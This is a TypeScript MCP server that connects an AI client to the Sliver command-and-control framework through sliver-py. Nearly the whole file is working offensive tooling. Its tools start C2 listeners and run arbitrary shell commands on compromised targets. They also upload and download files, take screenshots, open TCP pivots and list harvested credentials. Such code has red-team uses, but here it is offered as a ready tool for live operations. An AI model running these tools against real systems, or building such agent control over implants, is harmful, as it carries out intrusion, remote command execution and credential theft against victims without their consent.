#!/usr/bin/env node
/**
 * Sliver C2 MCP Server
 *
 * A Model Context Protocol server for interacting with Sliver C2 framework.
 * Provides tools for managing implants, sessions, beacons, listeners, and more.
 *
 * Uses sliver-py Python library via subprocess for reliable gRPC communication.
 */

import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
  Tool,
  TextContent,
} from "@modelcontextprotocol/sdk/types.js";
import { spawn, execSync } from "child_process";
import { existsSync } from "fs";

// Configuration
interface SliverConfig {
  operatorConfigPath: string;
  pythonPath: string;
  timeout: number;
}

let config: SliverConfig = {
  operatorConfigPath: process.env.SLIVER_OPERATOR_CONFIG || "",
  pythonPath: process.env.PYTHON_PATH || "python3",
  timeout: parseInt(process.env.SLIVER_TIMEOUT || "30000"),
};

// Parse command line arguments
const args = process.argv.slice(2);
for (let i = 0; i < args.length; i++) {
  if (args[i] === "--operator-config" && args[i + 1]) {
    config.operatorConfigPath = args[i + 1];
    i++;
  } else if (args[i] === "--python" && args[i + 1]) {
    config.pythonPath = args[i + 1];
    i++;
  } else if (args[i] === "--timeout" && args[i + 1]) {
    config.timeout = parseInt(args[i + 1]);
    i++;
  }
}

/**
 * Execute a Sliver command via Python bridge
 */
async function executeSliverCommand(
  command: string,
  params: Record<string, unknown> = {}
): Promise<unknown> {
  return new Promise((resolve, reject) => {
    const pythonScript = `
import sys
import json
import asyncio

async def main():
    try:
        from sliver import SliverClientConfig, SliverClient

        config_path = ${JSON.stringify(config.operatorConfigPath)}
        if not config_path:
            print(json.dumps({"error": "No operator config file specified. Use --operator-config flag or SLIVER_OPERATOR_CONFIG env var"}))
            return

        config = SliverClientConfig.parse_config_file(config_path)
        client = SliverClient(config)
        await client.connect()

        command = ${JSON.stringify(command)}
        params = ${JSON.stringify(params)}

        result = await execute_command(client, command, params)
        print(json.dumps({"success": True, "data": result}))

    except ImportError as e:
        print(json.dumps({"error": f"sliver-py not installed: {str(e)}. Install with: pip install sliver-py"}))
    except FileNotFoundError as e:
        print(json.dumps({"error": f"Operator config file not found: {str(e)}"}))
    except Exception as e:
        print(json.dumps({"error": str(e)}))

async def execute_command(client, command, params):
    # Server info commands
    if command == "version":
        version = await client.version()
        return {"major": version.Major, "minor": version.Minor, "patch": version.Patch}

    elif command == "operators":
        operators = await client.operators()
        return [{"name": op.Name, "online": op.Online} for op in operators]

    # Session commands
    elif command == "sessions":
        sessions = await client.sessions()
        return [{
            "id": s.ID,
            "name": s.Name,
            "hostname": s.Hostname,
            "username": s.Username,
            "os": s.OS,
            "arch": s.Arch,
            "transport": s.Transport,
            "remote_address": s.RemoteAddress,
            "pid": s.PID,
            "filename": s.Filename,
            "active_c2": s.ActiveC2,
            "is_dead": s.IsDead
        } for s in sessions]

    elif command == "interact_session":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}
        interact = await client.interact_session(session_id)
        return {"success": True, "session_id": session_id}

    elif command == "kill_session":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}
        await client.kill_session(session_id)
        return {"success": True}

    # Beacon commands
    elif command == "beacons":
        beacons = await client.beacons()
        return [{
            "id": b.ID,
            "name": b.Name,
            "hostname": b.Hostname,
            "username": b.Username,
            "os": b.OS,
            "arch": b.Arch,
            "transport": b.Transport,
            "remote_address": b.RemoteAddress,
            "pid": b.PID,
            "interval": b.Interval,
            "jitter": b.Jitter,
            "next_checkin": b.NextCheckin,
            "task_count": len(b.Tasks) if hasattr(b, 'Tasks') and b.Tasks else 0
        } for b in beacons]

    elif command == "interact_beacon":
        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return {"error": "beacon_id required"}
        interact = await client.interact_beacon(beacon_id)
        return {"success": True, "beacon_id": beacon_id}

    # Listener commands
    elif command == "jobs":
        jobs = await client.jobs()
        return [{
            "id": j.ID,
            "name": j.Name,
            "description": j.Description,
            "protocol": j.Protocol,
            "port": j.Port
        } for j in jobs]

    elif command == "start_mtls_listener":
        host = params.get("host", "0.0.0.0")
        port = params.get("port", 8888)
        job = await client.start_mtls_listener(host, port)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "start_https_listener":
        host = params.get("host", "0.0.0.0")
        port = params.get("port", 443)
        domain = params.get("domain", "")
        job = await client.start_https_listener(host, port, domain=domain)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "start_http_listener":
        host = params.get("host", "0.0.0.0")
        port = params.get("port", 80)
        domain = params.get("domain", "")
        job = await client.start_http_listener(host, port, domain=domain)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "start_dns_listener":
        domains = params.get("domains", [])
        job = await client.start_dns_listener(domains)
        return {"id": job.ID, "name": job.Name}

    elif command == "start_wg_listener":
        port = params.get("port", 53)
        job = await client.start_wg_listener(port)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "kill_job":
        job_id = params.get("job_id")
        if not job_id:
            return {"error": "job_id required"}
        await client.kill_job(job_id)
        return {"success": True}

    # Implant generation commands
    elif command == "implant_builds":
        builds = await client.implant_builds()
        result = {}
        for name, build in builds.items():
            result[name] = {
                "id": build.ID,
                "name": build.Name,
                "os": build.GOOS,
                "arch": build.GOARCH,
                "format": str(build.Format),
                "is_beacon": build.IsBeacon
            }
        return result

    elif command == "generate":
        # Generate implant with specified options
        os_target = params.get("os", "linux")
        arch = params.get("arch", "amd64")
        format_type = params.get("format", "EXECUTABLE")
        c2_urls = params.get("c2", [])
        is_beacon = params.get("is_beacon", False)
        name = params.get("name", "")

        # This is a simplified version - actual generation requires more params
        return {"error": "Direct implant generation requires more complex setup. Use Sliver console for now."}

    elif command == "implant_profiles":
        profiles = await client.implant_profiles()
        return [{
            "name": p.Name,
            "config": {
                "os": p.Config.GOOS if p.Config else None,
                "arch": p.Config.GOARCH if p.Config else None,
                "is_beacon": p.Config.IsBeacon if p.Config else None
            }
        } for p in profiles]

    # Session interaction commands (require active session)
    elif command == "session_ls":
        session_id = params.get("session_id")
        path = params.get("path", ".")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        ls_result = await interact.ls(path)
        return {
            "path": ls_result.Path,
            "exists": ls_result.Exists,
            "files": [{
                "name": f.Name,
                "is_dir": f.IsDir,
                "size": f.Size,
                "mode": str(f.Mode)
            } for f in ls_result.Files]
        }

    elif command == "session_pwd":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        pwd_result = await interact.pwd()
        return {"path": pwd_result.Path}

    elif command == "session_cd":
        session_id = params.get("session_id")
        path = params.get("path")
        if not session_id or not path:
            return {"error": "session_id and path required"}

        interact = await client.interact_session(session_id)
        await interact.cd(path)
        pwd_result = await interact.pwd()
        return {"path": pwd_result.Path}

    elif command == "session_mkdir":
        session_id = params.get("session_id")
        path = params.get("path")
        if not session_id or not path:
            return {"error": "session_id and path required"}

        interact = await client.interact_session(session_id)
        await interact.mkdir(path)
        return {"success": True, "path": path}

    elif command == "session_rm":
        session_id = params.get("session_id")
        path = params.get("path")
        recursive = params.get("recursive", False)
        if not session_id or not path:
            return {"error": "session_id and path required"}

        interact = await client.interact_session(session_id)
        await interact.rm(path, recursive=recursive)
        return {"success": True}

    elif command == "session_download":
        session_id = params.get("session_id")
        remote_path = params.get("remote_path")
        if not session_id or not remote_path:
            return {"error": "session_id and remote_path required"}

        interact = await client.interact_session(session_id)
        download = await interact.download(remote_path)
        # Return metadata, not the full file content
        return {
            "path": download.Path,
            "size": len(download.Data) if download.Data else 0,
            "exists": download.Exists,
            "is_dir": download.IsDir
        }

    elif command == "session_upload":
        session_id = params.get("session_id")
        local_path = params.get("local_path")
        remote_path = params.get("remote_path")
        if not session_id or not local_path or not remote_path:
            return {"error": "session_id, local_path, and remote_path required"}

        interact = await client.interact_session(session_id)
        with open(local_path, 'rb') as f:
            data = f.read()
        upload = await interact.upload(remote_path, data)
        return {"path": upload.Path, "success": True}

    elif command == "session_execute":
        session_id = params.get("session_id")
        exe = params.get("exe")
        args = params.get("args", [])
        output = params.get("output", True)
        if not session_id or not exe:
            return {"error": "session_id and exe required"}

        interact = await client.interact_session(session_id)
        result = await interact.execute(exe, args, output)
        return {
            "status": result.Status,
            "stdout": result.Stdout.decode('utf-8', errors='replace') if result.Stdout else "",
            "stderr": result.Stderr.decode('utf-8', errors='replace') if result.Stderr else "",
            "pid": result.Pid
        }

    elif command == "session_shell":
        session_id = params.get("session_id")
        command_str = params.get("command")
        if not session_id or not command_str:
            return {"error": "session_id and command required"}

        interact = await client.interact_session(session_id)
        # Use execute with shell
        if interact.os.lower() == "windows":
            result = await interact.execute("cmd.exe", ["/c", command_str], True)
        else:
            result = await interact.execute("/bin/sh", ["-c", command_str], True)
        return {
            "stdout": result.Stdout.decode('utf-8', errors='replace') if result.Stdout else "",
            "stderr": result.Stderr.decode('utf-8', errors='replace') if result.Stderr else "",
            "status": result.Status
        }

    elif command == "session_ps":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        ps_result = await interact.ps()
        return [{
            "pid": p.Pid,
            "ppid": p.Ppid,
            "executable": p.Executable,
            "owner": p.Owner,
            "architecture": p.Architecture
        } for p in ps_result.Processes[:50]]  # Limit to 50

    elif command == "session_ifconfig":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        ifconfig = await interact.ifconfig()
        return [{
            "index": iface.Index,
            "name": iface.Name,
            "mac": iface.MAC,
            "addresses": [{"ip": addr.Ip, "mask": addr.Mask} for addr in iface.IPAddresses]
        } for iface in ifconfig.NetInterfaces]

    elif command == "session_netstat":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        netstat = await interact.netstat()
        return [{
            "local_addr": {"ip": e.LocalAddr.Ip, "port": e.LocalAddr.Port},
            "remote_addr": {"ip": e.RemoteAddr.Ip, "port": e.RemoteAddr.Port} if e.RemoteAddr else None,
            "protocol": e.Protocol,
            "state": e.SkState,
            "pid": e.Pid,
            "process": e.Process
        } for e in netstat.Entries[:50]]  # Limit to 50

    elif command == "session_screenshot":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        screenshot = await interact.screenshot()
        return {
            "size": len(screenshot.Data) if screenshot.Data else 0,
            "success": True
        }

    # Pivot commands
    elif command == "pivot_listeners":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        pivots = await interact.list_pivots()
        return [{
            "id": p.ID,
            "type": str(p.Type),
            "bind_address": p.BindAddress
        } for p in pivots]

    elif command == "pivot_start_tcp":
        session_id = params.get("session_id")
        port = params.get("port", 9898)
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        pivot = await interact.start_tcp_pivot(port)
        return {
            "id": pivot.ID,
            "bind_address": pivot.BindAddress,
            "type": "TCP"
        }

    # Credentials
    elif command == "creds":
        creds = await client.creds()
        return [{
            "id": c.ID,
            "username": c.Username,
            "plaintext": c.Plaintext,
            "hash": c.Hash,
            "hash_type": str(c.HashType),
            "hostname": c.Hostname,
            "origin": str(c.Origin.Type) if c.Origin else None
        } for c in creds.Credentials]

    # Hosts
    elif command == "hosts":
        hosts = await client.hosts()
        return [{
            "id": h.HostUUID,
            "hostname": h.Hostname,
            "os": h.OSVersion,
            "ioc_count": len(h.IOCs) if h.IOCs else 0
        } for h in hosts.Hosts]

    else:
        return {"error": f"Unknown command: {command}"}

asyncio.run(main())
`;

    const python = spawn(config.pythonPath, ["-c", pythonScript], {
      timeout: config.timeout,
    });

    let stdout = "";
    let stderr = "";

    python.stdout.on("data", (data: Buffer) => {
      stdout += data.toString();
    });

    python.stderr.on("data", (data: Buffer) => {
      stderr += data.toString();
    });

    python.on("close", (code: number | null) => {
      if (code !== 0 && !stdout) {
        reject(new Error(`Python process exited with code ${code}: ${stderr}`));
        return;
      }

      try {
        // Find the JSON in stdout (may have extra output)
        const jsonMatch = stdout.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
          const result = JSON.parse(jsonMatch[0]);
          if (result.error) {
            reject(new Error(result.error));
          } else {
            resolve(result.data);
          }
        } else {
          reject(new Error(`No JSON in output: ${stdout}`));
        }
      } catch (e) {
        reject(new Error(`Failed to parse output: ${stdout}\nError: ${e}`));
      }
    });

    python.on("error", (err: Error) => {
      reject(err);
    });
  });
}

// Tool definitions
const SLIVER_TOOLS: Tool[] = [
  // Server info
  {
    name: "sliver_version",
    description: "Get Sliver server version information",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_operators",
    description: "List all connected operators",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },

  // Sessions
  {
    name: "sliver_sessions",
    description:
      "List all active sessions (real-time implant connections)",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_kill_session",
    description: "Kill/terminate a session",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID to kill",
        },
      },
      required: ["session_id"],
    },
  },

  // Beacons
  {
    name: "sliver_beacons",
    description:
      "List all beacons (asynchronous callback implants)",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },

  // Listeners/Jobs
  {
    name: "sliver_listeners",
    description: "List all active listeners/jobs",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_start_mtls",
    description: "Start an mTLS (mutual TLS) listener",
    inputSchema: {
      type: "object",
      properties: {
        host: {
          type: "string",
          description: "Host to bind to (default: 0.0.0.0)",
          default: "0.0.0.0",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 8888)",
          default: 8888,
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_start_https",
    description: "Start an HTTPS listener",
    inputSchema: {
      type: "object",
      properties: {
        host: {
          type: "string",
          description: "Host to bind to (default: 0.0.0.0)",
          default: "0.0.0.0",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 443)",
          default: 443,
        },
        domain: {
          type: "string",
          description: "Domain for the listener",
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_start_http",
    description: "Start an HTTP listener",
    inputSchema: {
      type: "object",
      properties: {
        host: {
          type: "string",
          description: "Host to bind to (default: 0.0.0.0)",
          default: "0.0.0.0",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 80)",
          default: 80,
        },
        domain: {
          type: "string",
          description: "Domain for the listener",
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_start_dns",
    description: "Start a DNS listener",
    inputSchema: {
      type: "object",
      properties: {
        domains: {
          type: "array",
          items: { type: "string" },
          description: "Domains for DNS C2",
        },
      },
      required: ["domains"],
    },
  },
  {
    name: "sliver_start_wg",
    description: "Start a WireGuard listener",
    inputSchema: {
      type: "object",
      properties: {
        port: {
          type: "number",
          description: "Port to listen on (default: 53)",
          default: 53,
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_kill_listener",
    description: "Stop/kill a listener job",
    inputSchema: {
      type: "object",
      properties: {
        job_id: {
          type: "number",
          description: "Job ID to kill",
        },
      },
      required: ["job_id"],
    },
  },

  // Implant builds
  {
    name: "sliver_implant_builds",
    description: "List all implant builds",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_implant_profiles",
    description: "List all implant generation profiles",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },

  // Session file operations
  {
    name: "sliver_ls",
    description: "List files on target (session)",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Path to list (default: current directory)",
          default: ".",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_pwd",
    description: "Get current working directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_cd",
    description: "Change directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Path to change to",
        },
      },
      required: ["session_id", "path"],
    },
  },
  {
    name: "sliver_mkdir",
    description: "Create directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Directory path to create",
        },
      },
      required: ["session_id", "path"],
    },
  },
  {
    name: "sliver_rm",
    description: "Remove file or directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Path to remove",
        },
        recursive: {
          type: "boolean",
          description: "Remove recursively",
          default: false,
        },
      },
      required: ["session_id", "path"],
    },
  },
  {
    name: "sliver_download",
    description: "Download file from target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        remote_path: {
          type: "string",
          description: "Remote path to download",
        },
      },
      required: ["session_id", "remote_path"],
    },
  },
  {
    name: "sliver_upload",
    description: "Upload file to target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        local_path: {
          type: "string",
          description: "Local file path",
        },
        remote_path: {
          type: "string",
          description: "Remote destination path",
        },
      },
      required: ["session_id", "local_path", "remote_path"],
    },
  },

  // Command execution
  {
    name: "sliver_execute",
    description: "Execute a program on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        exe: {
          type: "string",
          description: "Executable path",
        },
        args: {
          type: "array",
          items: { type: "string" },
          description: "Arguments",
          default: [],
        },
        output: {
          type: "boolean",
          description: "Capture output",
          default: true,
        },
      },
      required: ["session_id", "exe"],
    },
  },
  {
    name: "sliver_shell",
    description: "Execute a shell command on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        command: {
          type: "string",
          description: "Shell command to execute",
        },
      },
      required: ["session_id", "command"],
    },
  },

  // System enumeration
  {
    name: "sliver_ps",
    description: "List processes on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_ifconfig",
    description: "Get network interfaces on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_netstat",
    description: "Get network connections on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_screenshot",
    description: "Take a screenshot on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },

  // Pivots
  {
    name: "sliver_pivot_listeners",
    description: "List pivot listeners on session",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_pivot_start_tcp",
    description: "Start a TCP pivot listener on session",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 9898)",
          default: 9898,
        },
      },
      required: ["session_id"],
    },
  },

  // Credentials & Hosts
  {
    name: "sliver_creds",
    description: "List harvested credentials",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_hosts",
    description: "List discovered hosts",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
];

// Create the MCP server
const server = new Server(
  {
    name: "sliver-c2-mcp",
    version: "1.0.0",
  },
  {
    capabilities: {
      tools: {},
    },
  }
);

// Handle tool listing
server.setRequestHandler(ListToolsRequestSchema, async () => {
  return { tools: SLIVER_TOOLS };
});

// Handle tool execution
server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { name, arguments: args } = request.params;

  try {
    let result: unknown;

    switch (name) {
      case "sliver_version":
        result = await executeSliverCommand("version");
        break;

      case "sliver_operators":
        result = await executeSliverCommand("operators");
        break;

      case "sliver_sessions":
        result = await executeSliverCommand("sessions");
        break;

      case "sliver_kill_session":
        result = await executeSliverCommand("kill_session", args as Record<string, unknown>);
        break;

      case "sliver_beacons":
        result = await executeSliverCommand("beacons");
        break;

      case "sliver_listeners":
        result = await executeSliverCommand("jobs");
        break;

      case "sliver_start_mtls":
        result = await executeSliverCommand("start_mtls_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_https":
        result = await executeSliverCommand("start_https_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_http":
        result = await executeSliverCommand("start_http_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_dns":
        result = await executeSliverCommand("start_dns_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_wg":
        result = await executeSliverCommand("start_wg_listener", args as Record<string, unknown>);
        break;

      case "sliver_kill_listener":
        result = await executeSliverCommand("kill_job", args as Record<string, unknown>);
        break;

      case "sliver_implant_builds":
        result = await executeSliverCommand("implant_builds");
        break;

      case "sliver_implant_profiles":
        result = await executeSliverCommand("implant_profiles");
        break;

      case "sliver_ls":
        result = await executeSliverCommand("session_ls", args as Record<string, unknown>);
        break;

      case "sliver_pwd":
        result = await executeSliverCommand("session_pwd", args as Record<string, unknown>);
        break;

      case "sliver_cd":
        result = await executeSliverCommand("session_cd", args as Record<string, unknown>);
        break;

      case "sliver_mkdir":
        result = await executeSliverCommand("session_mkdir", args as Record<string, unknown>);
        break;

      case "sliver_rm":
        result = await executeSliverCommand("session_rm", args as Record<string, unknown>);
        break;

      case "sliver_download":
        result = await executeSliverCommand("session_download", args as Record<string, unknown>);
        break;

      case "sliver_upload":
        result = await executeSliverCommand("session_upload", args as Record<string, unknown>);
        break;

      case "sliver_execute":
        result = await executeSliverCommand("session_execute", args as Record<string, unknown>);
        break;

      case "sliver_shell":
        result = await executeSliverCommand("session_shell", args as Record<string, unknown>);
        break;

      case "sliver_ps":
        result = await executeSliverCommand("session_ps", args as Record<string, unknown>);
        break;

      case "sliver_ifconfig":
        result = await executeSliverCommand("session_ifconfig", args as Record<string, unknown>);
        break;

      case "sliver_netstat":
        result = await executeSliverCommand("session_netstat", args as Record<string, unknown>);
        break;

      case "sliver_screenshot":
        result = await executeSliverCommand("session_screenshot", args as Record<string, unknown>);
        break;

      case "sliver_pivot_listeners":
        result = await executeSliverCommand("pivot_listeners", args as Record<string, unknown>);
        break;

      case "sliver_pivot_start_tcp":
        result = await executeSliverCommand("pivot_start_tcp", args as Record<string, unknown>);
        break;

      case "sliver_creds":
        result = await executeSliverCommand("creds");
        break;

      case "sliver_hosts":
        result = await executeSliverCommand("hosts");
        break;

      default:
        throw new Error(`Unknown tool: ${name}`);
    }

    const content: TextContent[] = [
      {
        type: "text",
        text: JSON.stringify(result, null, 2),
      },
    ];

    return { content };
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      content: [
        {
          type: "text",
          text: `Error: ${errorMessage}`,
        },
      ],
      isError: true,
    };
  }
});

// Main entry point
async function main() {
  // Validate configuration
  if (!config.operatorConfigPath) {
    console.error(
      "Warning: No operator config specified. Use --operator-config flag or SLIVER_OPERATOR_CONFIG env var"
    );
  } else if (!existsSync(config.operatorConfigPath)) {
    console.error(`Warning: Operator config file not found: ${config.operatorConfigPath}`);
  }

  // Check if sliver-py is installed
  try {
    execSync(`${config.pythonPath} -c "import sliver"`, { stdio: "pipe" });
  } catch {
    console.error(
      "Warning: sliver-py not installed. Install with: pip install sliver-py"
    );
  }

  const transport = new StdioServerTransport();
  await server.connect(transport);
}

main().catch(console.error);
